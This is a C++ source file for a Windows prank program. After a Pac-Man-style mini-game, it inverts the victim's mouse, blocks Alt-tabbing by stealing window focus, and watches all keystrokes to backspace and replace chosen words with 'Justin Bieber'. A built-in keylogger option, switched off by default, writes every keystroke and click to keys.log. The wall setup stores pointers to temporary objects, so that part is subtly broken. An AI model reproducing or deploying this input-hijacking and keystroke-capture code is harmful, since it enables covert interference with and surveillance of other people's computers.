// EvilBullshitWindowless.cpp : Defines the entry point for the application.
//

// todo: random set of replacement words

#include "stdafx.h"
#include "EvilBullshitWindowless.h"
#include <Windows.h>
#include <wincodec.h>
#include <ctime>
#include <fstream>
#include <atlstr.h>
#include <vector>
#include <string>
#include "resource.h"

using std::string;
using std::vector;

// things for moving the splash screen
HWND splashWindow;
HDC g_hdcScreen;
HDC g_hdcMem;
POINT ptZero = { 0 };
SIZE g_sizeSplash;
BLENDFUNCTION g_blend;
POINT ptOrigin;
HWND g_splashWindow;
HWND g_evilWindow;
HBITMAP g_slashMap;
vector<HBITMAP> logoAnimation;
vector<HBITMAP> deathAnimation;

int maxx;
int maxy;
bool left, right, up, down;

// Global Variables:
#define MAX_LOADSTRING 100
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name
int _nCmdShow;

#include "splashIamge.h"

#define SHIFT   1
#define CONTROL 2
#define ALT 4
#define CLICK 8

// replacement word
string replacement = "Justin Bieber";
// list of key phrases
vector<string> KeyWords = { "coffee", "drink", "something", "wrong", "type" };
// do we want to also be a keylogger?
bool logKeys = false;

#include "stringFunctions.h"

int rotclamp(int val, int min, int max) {
	if (val < min) return max;
	if (val > max) return min;
	return val;
}

#include "GameEntity.h"
GameEntity pacMan,inky,blinky,pinky,clyde;

// enter loop of sillyness
void loopforever() {
	// get the primary monitor's info
	HMONITOR hmonPrimary = MonitorFromPoint(ptZero, MONITOR_DEFAULTTOPRIMARY);
	MONITORINFO monitorinfo = { 0 };
	monitorinfo.cbSize = sizeof(monitorinfo);
	GetMonitorInfo(hmonPrimary, &monitorinfo);

	// center the splash screen in the middle of the primary work area
	RECT & rcWork = monitorinfo.rcWork;
	maxx = rcWork.right - rcWork.left;
	maxy = rcWork.bottom - rcWork.top;

	// set game items
	pacMan = GameEntity(0, 0, 48, 48, g_splashWindow);
	inky = GameEntity(0, 0, 48, 48);
	blinky = GameEntity(maxx - 100, 0, 48, 48);
	pinky = GameEntity(maxx - 100, maxy - 100, 48, 48);
	clyde = GameEntity(0, maxy - 100, 48, 48);

	vector<GameEntity*> ghosts = { &inky,&blinky,&pinky,&clyde };

	vector<GameEntity*> walls = { &GameEntity(50,0,48,480),
		&GameEntity(550,0,48,480),
		&GameEntity(550,830,48,480),
		&GameEntity(550,450,480,48),
		&GameEntity(1550,maxy-480,48,480) };

	for (auto&& wall : walls) {
		if (wall->h > wall->w)
			wall->LoadSpritemap({ IDB_WALL });
		else
			wall->LoadSpritemap({ IDB_WALL_W });
	}


	// load images here
	g_slashMap = LoadSplashImage(IDB_PNG1);
	logoAnimation = vector<HBITMAP>();
	logoAnimation.push_back(LoadSplashImage(IDB_logo0));
	logoAnimation.push_back(LoadSplashImage(IDB_logo1));
	logoAnimation.push_back(LoadSplashImage(IDB_logo2));
	logoAnimation.push_back(LoadSplashImage(IDB_logo3));

	deathAnimation = vector<HBITMAP>();
	deathAnimation.push_back(LoadSplashImage(IDB_Die1));
	deathAnimation.push_back(LoadSplashImage(IDB_Die2));
	deathAnimation.push_back(LoadSplashImage(IDB_Die3));
	deathAnimation.push_back(LoadSplashImage(IDB_Die4));
	int deathx = 800;
	int deathy = 600;

	// create splash window and init it
	g_splashWindow = CreateSplashWindow(hInst);
	g_evilWindow = CreateSplashWindow(hInst);
	
	//set sprites for characters
	pacMan.LoadSpritemap({ IDB_Pac_l_c,IDB_Pac_l_o,IDB_Pac_r_c,IDB_Pac_r_o,IDB_Pac_u_c,IDB_Pac_u_o,IDB_Pac_d_c,IDB_Pac_d_o });
	inky.LoadSpritemap({ IDB_Ink_l,IDB_Ink_l,IDB_Ink_r,IDB_Ink_r,IDB_Ink_u,IDB_Ink_u,IDB_Ink_d,IDB_Ink_d });
	blinky.LoadSpritemap({ IDB_Blink_l,IDB_Blink_l,IDB_Blink_r,IDB_Blink_r,IDB_Blink_u,IDB_Blink_u,IDB_Blink_d,IDB_Blink_d });
	pinky.LoadSpritemap({ IDB_Pink_l,IDB_Pink_l,IDB_Pink_r,IDB_Pink_r,IDB_Pink_u,IDB_Pink_u,IDB_Pink_d,IDB_Pink_d });
	clyde.LoadSpritemap({ IDB_Clyde_l,IDB_Clyde_l,IDB_Clyde_r,IDB_Clyde_r,IDB_Clyde_u,IDB_Clyde_u,IDB_Clyde_d,IDB_Clyde_d });

	// set up objects
	unsigned int state = 0;
	unsigned int oldState = 0;
	auto recentKeys = std::vector<char>();
	std::ofstream outfile;
	outfile.open("keys.log", std::ios_base::app);
	outfile << "\nData:\n";	
	size_t patternLength = 0;
	for (auto&& pattern : KeyWords) {
		if (pattern.length() > patternLength)
			patternLength = pattern.length();
	}
	
	int posX = 0;
	int posY = 0;
	int yd = 5;
	int xd = 5;
	int i = 0;
	int gamestate = 0;
	POINT currentMouse, lastMouse;
	GetCursorPos(&currentMouse);
	lastMouse = currentMouse;

	left = right = up = down = false;

	// enter loop state
	while (1) {
		// do bounce animation
		if (gamestate < 3) {
			if (posX > maxx - g_sizeSplash.cx || posX < 0) {
				xd *= -1;
			}
			posX += xd;
			if (posY > maxy - g_sizeSplash.cy || posY < 0) {
				yd *= -1;
			}
			posY += yd;
			i += 8;
			if (i < 0 || i >= 4000) {
				i = 0;
				if (gamestate == 0) {
					gamestate = 1;
					pacMan.x = posX;
					pacMan.y = posY;
					SwitchToThisWindow(clyde.window, true);
					SwitchToThisWindow(inky.window, true);
					SwitchToThisWindow(pinky.window, true);
					SwitchToThisWindow(blinky.window, true);
					for (auto&& wall : walls) {
						SwitchToThisWindow(wall->window, true);
					}
				}
				else if (gamestate == 2) {
					// switch from death screen to secret mode
					gamestate = 3;
					for (auto&& wall : walls) {
						ShowWindow(wall->window, SW_HIDE);
					}

					for (auto&& ghost : ghosts) {
						ShowWindow(ghost->window, SW_HIDE);
					}
					ShowWindow(pacMan.window, SW_HIDE);
				}
			}

			if (gamestate == 0) {
				SwitchToThisWindow(g_splashWindow, true);
				SetSplashImage(g_splashWindow, logoAnimation[(i % 40) / 10], posX, posY);
			}
			else if (gamestate == 2) {
				SwitchToThisWindow(g_splashWindow, true);
				SetSplashImage(g_splashWindow, deathAnimation[(i % 40) / 10], (maxx - deathx) / 2, (maxy - deathy) / 2);
			}
			else if (gamestate == 1) {
				SetSplashImage(g_splashWindow, logoAnimation[((1 + i) % 40) / 10], maxx - posX, posY);
				SetSplashImage(g_evilWindow, logoAnimation[(i % 40) / 10], posX, posY);
				SwitchToThisWindow(pacMan.window, true);
				i++;
				if (i < 0 || i >= 200) {
					i = 0;
				}
				// only use the most recent direction
				{
					bool test;
					if (test = GetAsyncKeyState(VK_LEFT)) {
						if (!left)
							pacMan.direction = 0;
					}
					left = test;
					if (test = GetAsyncKeyState(VK_RIGHT)) {
						if (!right)
							pacMan.direction = 1;
					}
					right = test;
					if (test = GetAsyncKeyState(VK_UP)) {
						if (!up)
							pacMan.direction = 2;
					}
					up = test;
					if (test = GetAsyncKeyState(VK_DOWN)) {
						if (!down)
							pacMan.direction = 3;
					}
					down = test;
				}

				// have ghosts target eachother
				/*for (int k = 0; k < ghosts.size(); k++) {
					auto kprime = rotclamp(k+1, 0, ghosts.size() - 1);
					ghosts[k]->target(ghosts[kprime]->x, ghosts[kprime]->y);
				}*/				

				for (auto&& ghost : ghosts) {
					// have ghosts target you
					if (48 > ghost->target(pacMan.x, pacMan.y)) {
						// you die
						gamestate = 2;
					}
					ghost->blockedDirections = 0;
					for (auto&& wall : walls) {
						ghost->blockedDirections |= ghost->hitTest(wall);
					}
					ghost->update();
					ghost->draw();
				}
				pacMan.blockedDirections = 0;
				for (auto&& wall : walls) {
					wall->draw();
					pacMan.blockedDirections |= pacMan.hitTest(wall);
				}
				pacMan.update();
				pacMan.draw();
			}
		}
		else { // only activate if you lose
			//debugging
			//exit(1);

			//mouse wonking here
			// inverts mouse input
			if (gamestate == 3) {
				GetCursorPos(&currentMouse);
				int xdiff = lastMouse.x - currentMouse.x;
				int ydiff = lastMouse.y - currentMouse.y;
				lastMouse.x = rotclamp(lastMouse.x + xdiff, 1, maxx - 1);
				lastMouse.y = rotclamp(lastMouse.y + ydiff, 1, maxy - 1);
				SetCursorPos(lastMouse.x, lastMouse.y);
			}

			// this is the text replacer
			// watch special key state changes
			oldState = state;
			state = 0;
			if (GetAsyncKeyState(1)) {
				state |= CLICK;
				// random switch on click should make this confusing and annoying
				if (gamestate == 3 && rand()%2==0)SwitchToThisWindow(g_splashWindow, true);
				if (logKeys && state != oldState)
					outfile << "`CLICK`";
			}
			if (GetAsyncKeyState(16)) {
				state |= SHIFT;
			}
			if (GetAsyncKeyState(17)) {
				state |= CONTROL;
				if (logKeys && state != oldState)
					outfile << "`CTRL-`";
			}
			if (GetAsyncKeyState(18)) {
				state |= ALT;
				// no alt-tabbing lol
				SwitchToThisWindow(g_splashWindow, true);
				if (logKeys && state != oldState)
					outfile << "`ALT-`";
			}
			// check range of virtual keys
			for (int i = 0; i < 256; i++) {
				// key with id of i has been pressed, cast to unsigned char for boolean test
				if ((unsigned char)GetAsyncKeyState(i)) {
					// transform to ascii value
					auto ch = VKtoASCII(i, (state & SHIFT));
					// throw out garbage
					if (ch > 0) {
						// remember recent keys
						recentKeys.push_back(lowercase(ch));
						// forget old keys
						if (recentKeys.size() > patternLength) {
							recentKeys.erase(recentKeys.begin());
						}
						// keylog if set
						if (logKeys) {
							outfile << ch;
							outfile.flush();
						}
						// if a key phrase has been typed count it's length
						// then backspace it away and type out a replacement
						auto replaceChars = typedKeyPhrase(recentKeys);
						if (replaceChars) {							
							for (int i = replaceChars; i--;) {
								triggerKey(VK_BACK);
							}

							typeString(replacement);
							
							if (gamestate != 3) {
								gamestate = 0;
								SetSplashImage(g_splashWindow, g_slashMap, 0, 0, true);
								SetSplashImage(g_evilWindow, g_slashMap, 0, 0, true);
							}
						}
					}
				}
			}
		}
		Sleep(10);
	}
}

#include "windowsCrap.h"